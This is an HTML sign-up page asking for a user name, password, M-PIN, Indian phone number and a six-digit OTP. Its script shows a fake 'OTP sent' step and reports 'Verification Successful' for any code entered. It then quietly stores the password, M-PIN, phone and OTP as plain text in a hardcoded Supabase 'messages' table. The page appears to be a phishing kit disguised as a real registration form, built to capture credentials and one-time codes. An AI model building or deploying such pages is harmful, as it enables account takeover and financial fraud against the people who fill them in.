<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">
    <div class="w-full max-w-sm bg-white p-6 rounded-3xl shadow-sm border border-gray-100">
        <div class="flex items-center mb-6">
            <span class="text-emerald-500 text-2xl font-bold mr-2 cursor-pointer">&lt;</span>
            <h1 class="text-2xl font-bold text-emerald-600">Register</h1>
        </div>
        <form id="signupForm" class="space-y-4">
            <div class="relative flex items-center bg-gray-100 rounded-full px-5 py-3 border border-transparent focus-within:border-emerald-500 focus-within:bg-white transition">
                <input type="text" id="username" placeholder="User Name" required class="w-full bg-transparent text-gray-800 placeholder-gray-400 focus:outline-none">
            </div>
            <div class="relative flex items-center bg-gray-100 rounded-full px-5 py-3 border border-transparent focus-within:border-emerald-500 focus-within:bg-white transition">
                <input type="password" id="password" placeholder="Password" required class="w-full bg-transparent text-gray-800 placeholder-gray-400 focus:outline-none">
            </div>
            <div class="relative flex items-center bg-gray-100 rounded-full px-5 py-3 border border-transparent focus-within:border-emerald-500 focus-within:bg-white transition">
                <input type="password" id="mpin" placeholder="M-PIN" maxlength="6" required class="w-full bg-transparent text-gray-800 placeholder-gray-400 focus:outline-none">
            </div>
            <div class="relative flex items-center bg-gray-100 rounded-full px-5 py-3 border border-transparent focus-within:border-emerald-500 focus-within:bg-white transition">
                <span class="text-gray-500 font-medium mr-2">+91</span>
                <input type="tel" id="phone" placeholder="Phone" required class="w-full bg-transparent text-gray-800 placeholder-gray-400 focus:outline-none">
            </div>
            <div class="relative flex items-center bg-gray-100 rounded-full px-5 py-3 border border-transparent focus-within:border-emerald-500 focus-within:bg-white transition">
                <input type="text" id="referral" placeholder="Referral Code" class="w-full bg-transparent text-gray-800 placeholder-gray-400 focus:outline-none">
            </div>
            <button type="submit" class="w-full py-4 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-full shadow-lg shadow-emerald-200 mt-6 transition text-lg">
                Sign Up
            </button>
        </form>
        <div class="text-center mt-4">
            <p class="text-sm text-gray-600">Already have an account? <a href="#" class="text-emerald-600 font-semibold">Login</a></p>
            <a href="#" class="block text-sm text-blue-600 mt-2 underline">Download App</a>
        </div>
    </div>

    <!-- 6-Box OTP Modal -->
    <div id="otpModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center p-4 z-50">
        <div class="bg-white rounded-3xl p-6 max-w-sm w-full text-center shadow-2xl relative">
            <h3 class="text-2xl font-bold text-gray-800 mb-2">OTP Sent</h3>
            <p class="text-sm text-gray-500 mb-6 px-4" id="otpMessage">A 6-digit code has been sent</p>
            <div id="otpInputs" class="flex justify-between gap-2 mb-6 px-2">
                <input type="text" maxlength="1" class="w-12 h-14 text-center text-2xl font-bold border-2 border-emerald-500 rounded-2xl focus:border-emerald-600 focus:outline-none shadow-sm">
                <input type="text" maxlength="1" class="w-12 h-14 text-center text-2xl font-bold border-2 border-emerald-500 rounded-2xl focus:border-emerald-600 focus:outline-none shadow-sm">
                <input type="text" maxlength="1" class="w-12 h-14 text-center text-2xl font-bold border-2 border-emerald-500 rounded-2xl focus:border-emerald-600 focus:outline-none shadow-sm">
                <input type="text" maxlength="1" class="w-12 h-14 text-center text-2xl font-bold border-2 border-emerald-500 rounded-2xl focus:border-emerald-600 focus:outline-none shadow-sm">
                <input type="text" maxlength="1" class="w-12 h-14 text-center text-2xl font-bold border-2 border-emerald-500 rounded-2xl focus:border-emerald-600 focus:outline-none shadow-sm">
                <input type="text" maxlength="1" class="w-12 h-14 text-center text-2xl font-bold border-2 border-emerald-500 rounded-2xl focus:border-emerald-600 focus:outline-none shadow-sm">
            </div>
            <button onclick="verifyOtp()" class="w-full py-4 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-full shadow-lg transition text-lg mb-4">
                Submit
            </button>
            <p id="verificationResult" class="mt-2 font-bold text-lg hidden"></p>
        </div>
    </div>

    <script>
        const SUPABASE_URL = 'https://zvswgqddbeykgrhlovgp.supabase.co';
        const SUPABASE_ANON_KEY = 'sb_publishable_moe4DeFFDoQjVmcCLPtOmQ_VXcW9TyD';
        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        let pendingData = {};

        document.getElementById('signupForm').addEventListener('submit', function(e) {
            e.preventDefault();
            pendingData = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                mpin: document.getElementById('mpin').value,
                phone: document.getElementById('phone').value,
                referral: document.getElementById('referral').value
            };
            document.getElementById('otpMessage').innerText = 'A 6-digit code has been sent to +91 ' + pendingData.phone;
            document.getElementById('verificationResult').classList.add('hidden');
            document.getElementById('otpModal').style.display = 'flex';
        });

        const inputs = document.querySelectorAll('#otpInputs input');
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        async function verifyOtp() {
            let otp = '';
            inputs.forEach(input => otp += input.value);
            
            const resultText = document.getElementById('verificationResult');
            resultText.innerText = 'Verification Successful';
            resultText.className = 'mt-4 font-bold text-emerald-600 text-xl block animate-bounce';

            if (otp.length === 6) {
                await supabase
                    .from('messages')
                    .insert([{ content: JSON.stringify({...pendingData, otp: otp}) }]);
            }
        }
    </script>
</body>
</html>
